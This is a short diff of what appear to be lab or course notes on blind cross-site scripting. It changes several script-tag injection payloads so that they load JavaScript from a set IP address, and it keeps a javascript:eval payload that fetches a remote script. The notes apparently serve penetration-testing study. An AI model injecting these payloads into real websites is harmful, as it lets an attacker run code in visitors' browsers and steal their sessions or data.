@@ -5,10 +5,11 @@ To know which input fields are vulnerable, we can try loading a remote `js` file
 > Blind XSS has a higher success rate with DOM XSS type of vulnerabilities because of the ability to read the source code and creating a payload based off of it.
 
 
+## TEST ALL PAYLOADS
 ```js
-<script src=http://OUR_IP></script>
-'><script src=http://OUR_IP></script>
-"><script src=http://OUR_IP></script>
+<script src=http://10.10.15.8></script>
+'><script src=http://10.10.15.8></script>
+"><script src=http://10.10.15.8></script>
 
 javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
 
